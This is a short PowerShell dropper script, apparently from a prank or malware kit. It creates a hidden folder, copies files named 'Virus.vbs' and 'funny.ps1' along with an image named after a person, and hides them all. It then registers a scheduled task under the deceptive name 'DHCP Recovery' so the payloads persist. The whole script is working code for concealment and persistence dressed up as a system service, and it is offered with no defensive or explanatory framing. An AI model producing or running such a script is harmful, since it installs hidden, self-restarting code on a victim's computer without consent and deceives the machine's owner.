# Define file paths
$destFolder = "C:\Hidden"
$taskFile = "$PSScriptRoot\DHCP Recovery.xml"

# Create Hidden Folder
if (!(Test-Path $destFolder)) {
    New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
}

# Set Hidden Attribute for Folder
attrib +h $destFolder  

# Copy Files
Copy-Item "$PSScriptRoot\Virus.vbs" $destFolder -Force
Copy-Item "$PSScriptRoot\funny.ps1" $destFolder -Force
Copy-Item "$PSScriptRoot\Jerrod-Brown.png" $destFolder -Force

# Set Hidden Attributes for Files
attrib +h "$destFolder\Virus.vbs"
attrib +h "$destFolder\funny.ps1"
attrib +h "$destFolder\Jerrod-Brown.png"

# Import Scheduled Task
schtasks /Create /XML "$taskFile" /TN "DHCP Recovery" /F